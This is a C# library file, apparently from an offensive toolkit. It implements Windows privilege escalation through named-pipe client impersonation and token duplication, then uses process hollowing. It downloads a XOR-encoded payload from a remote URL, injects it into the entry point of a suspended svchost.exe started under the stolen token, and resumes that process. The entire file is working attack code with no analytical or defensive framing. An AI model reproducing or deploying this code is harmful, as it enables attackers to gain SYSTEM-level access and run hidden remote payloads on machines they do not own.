using System;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;

/*
Compilation:
mcs csPipeLayer_dll.cs -platform:x64 -target:library
*/

namespace PipeLayer
{

public class PipeLayer
{
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateNamedPipe(
        string lpName,
        uint dwOpenMode,
        uint dwPipeMode,
        uint nMaxInstances,
        uint nOutBufferSize,
        uint nInBufferSize,
        uint nDefaultTimeOut,
        SECURITY_ATTRIBUTES lpSecurityAttributes
        );

    [DllImport("kernel32.dll")]
    private static extern bool ConnectNamedPipe(
        IntPtr hNamedPipe,
        IntPtr lpOverlapped
        );

    [DllImport("advapi32.dll")]
    private static extern bool ImpersonateNamedPipeClient(
        IntPtr hNamedPipe
        );

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool GetTokenInformation(
        IntPtr TokenHandle,
        TOKEN_INFORMATION_CLASS TokenInformationClass,
        IntPtr TokenInformation,
        int TokenInformationLength,
        out int ReturnLength
        );

    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private extern static bool DuplicateTokenEx(
        IntPtr hExistingToken,
        uint dwDesiredAccess,
        ref SECURITY_ATTRIBUTES lpTokenAttributes,
        SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
        TOKEN_TYPE TokenType,
        out IntPtr phNewToken
        );

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentThread();

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool OpenThreadToken(
        IntPtr ThreadHandle,
        uint DesiredAccess,
        bool OpenAsSelf,
        out IntPtr TokenHandle
        );

    [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool CreateProcessWithTokenW(
        IntPtr hToken,
        UInt32 dwLogonFlags,
        string lpApplicationName,
        string lpCommandLine,
        UInt32 dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        [In] ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
        );

    [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool ConvertSidToStringSid(
        IntPtr pSID,
        out IntPtr ptrSid
        );

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int ZwQueryInformationProcess(
        IntPtr processHandle,
        int processInformationClass,
        ref PROCESS_BASIC_INFORMATION processInformation,
        uint processInformationLength,
        ref uint returnLength
        );

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        [Out] byte[] lpBuffer,
        int dwSize,
        out IntPtr lpNumberOfBytesRead
        );

    [DllImport("kernel32.dll")]
    private static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        Int32 nSize,
        out IntPtr lpNumberOfBytesWritten
        );

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint ResumeThread(
        IntPtr hThread
        );

    [StructLayout(LayoutKind.Sequential)]
    private struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SID_AND_ATTRIBUTES
    {
        public IntPtr Sid;
        public int Attributes;
    }

    private struct TOKEN_USER
    {
        public SID_AND_ATTRIBUTES User;

        public TOKEN_USER(SID_AND_ATTRIBUTES user)
        {
            User = user;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    private struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr ExitStatus;
        public IntPtr PebBaseAddress;
        public IntPtr AffinityMask;
        public IntPtr BasePriority;
        public UIntPtr UniqueProcessId;
        public IntPtr InheritedFromUniqueProcessId;

        public int Size
        {
            get { return (int)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)); }
        }
    }

    public enum TOKEN_TYPE
    {
        TokenPrimary = 1,
        TokenImpersonation
    }

    enum SECURITY_IMPERSONATION_LEVEL : uint
    {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }

    private enum TOKEN_INFORMATION_CLASS : uint
    {
        TokenUser = 1
    }

    private const uint PIPE_ACCESS_DUPLEX = 0x00000003;
    private const uint PIPE_TYPE_BYTE = 0x00000000;
    private const uint TOKEN_ALL_ACCESS = 0xF01FF;
    public static int LayPipe(string pipeName, string payloadUrl, string xorKey)
    {
        TOKEN_USER tokenUser;
        SECURITY_ATTRIBUTES secAttrs = new SECURITY_ATTRIBUTES();
        STARTUPINFO startInfo = new STARTUPINFO();
        startInfo.cb = Marshal.SizeOf(startInfo);
        int TokenInfoLength = 0;

        IntPtr hPipe;
        IntPtr hToken;
        IntPtr hSystemToken;
        IntPtr pSidStr;
        IntPtr tokenInformation;

        string sidStr;

        Console.WriteLine("[+] Using the process hollowing technique.");
        Console.WriteLine("[+] Opening named pipe at {0} and waiting for connection", pipeName);

        hPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE, 10, 0x1000, 0x1000, 0, secAttrs);
        if (hPipe == IntPtr.Zero || !ConnectNamedPipe(hPipe, IntPtr.Zero))
        {
            Console.WriteLine("[x] CreateNamedPipe failed");
            return 1;
        }

        if (!ImpersonateNamedPipeClient(hPipe))
        {
            Console.WriteLine("[x] ImpersonateNamedPipeClient failed");
            return 2;
        }

        if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, out hToken))
        {
            Console.WriteLine("[+] Got thread token");

            // First call to GetTokenInformation will return a 0 = error status, but gives us the size of tokenInformation.
            if (!GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenUser, IntPtr.Zero, TokenInfoLength, out TokenInfoLength))
            {
                tokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfoLength);
                if (GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenUser, tokenInformation, TokenInfoLength, out _))
                {
                    tokenUser = (TOKEN_USER)Marshal.PtrToStructure(tokenInformation, typeof(TOKEN_USER));
                    if (ConvertSidToStringSid(tokenUser.User.Sid, out pSidStr))
                    {
                        sidStr = Marshal.PtrToStringAuto(pSidStr);
                        if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, ref secAttrs, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out hSystemToken))
                        {
                            Console.WriteLine("[x] DuplicateTokenEx failed");
                            return 7;
                        }

                        Console.WriteLine("[+] Launching process hollowing payload as user SID: {0}", sidStr);

                        byte[] payload;

                        try
                        {
                            payload = Convert.FromBase64String(new WebClient().DownloadString(payloadUrl));
                            payload = X0rCry(payload, xorKey);
                        }
                        catch (WebException)
                        {
                            Console.WriteLine("[x] Invalid URL supplied {0}", payloadUrl);
                            return 8;
                        }

                        PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
                        PROCESS_BASIC_INFORMATION procBasicInfo = new PROCESS_BASIC_INFORMATION();

                        CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\svchost.exe", 4, IntPtr.Zero, null, ref startInfo, out procInfo);

                        uint tmp = 0;
                        IntPtr hProcess = procInfo.hProcess;
                        ZwQueryInformationProcess(hProcess, 0, ref procBasicInfo, (uint)(IntPtr.Size * 6), ref tmp);

                        IntPtr ptrToImageBase = (IntPtr)((Int64)procBasicInfo.PebBaseAddress + 0x10);

                        byte[] addrBuf = new byte[IntPtr.Size];
                        IntPtr noBytesRead;
                        ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out noBytesRead);

                        IntPtr svchostBase = (IntPtr)BitConverter.ToInt64(addrBuf, 0);

                        byte[] data = new byte[0x200];
                        ReadProcessMemory(hProcess, svchostBase, data, data.Length, out noBytesRead);

                        uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);
                        uint opthdr = e_lfanew_offset + 0x28;
                        uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

                        IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

                        WriteProcessMemory(hProcess, addressOfEntryPoint, payload, payload.Length, out noBytesRead);
                        ResumeThread(procInfo.hThread);

                        return 0;
                    }
                    else
                    {
                        Console.WriteLine("[x] ConvertSidToStringSid failed");
                        return 6;
                    }
                }
                else
                {
                    Console.WriteLine("[x] GetTokenInformation 2 failed");
                    return 5;
                }
            }
            else
            {
                Console.WriteLine("[x] GetTokenInformation 1 failed");
                return 4;
            }
        }
        else
        {
            Console.WriteLine("[x] OpenThreadToken failed");
            return 3;
        }
    }
    private static byte[] X0rCry(byte[] inputData, string keyPhrase)
    {
        byte[] bufferBytes = new byte[inputData.Length]; for (int i = 0; i < inputData.Length; i++)
        {
            bufferBytes[i] = (byte)(inputData[i] ^ Encoding.UTF8.GetBytes(keyPhrase)[i % Encoding.UTF8.GetBytes(keyPhrase).Length]);
        }
        return bufferBytes;
    }
}

}